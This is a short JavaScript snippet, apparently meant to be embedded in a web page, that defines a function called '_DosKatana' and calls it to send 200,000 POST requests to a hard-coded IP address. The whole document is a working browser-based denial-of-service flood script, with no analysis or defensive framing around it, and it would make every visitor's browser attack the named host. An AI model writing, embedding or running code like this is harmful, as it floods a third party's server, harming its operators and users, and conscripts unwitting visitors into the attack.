			function _DosKatana(power, url) {
					for (i=1; i<=power; i++) {
						x = new XMLHttpRequest;

						x.onload = function() {
							document.write(this.responseText)
						};

						x.open('POST', url);
						x.send();
					}
			}

			_DosKatana(200000, 'http://88.198.48.45');
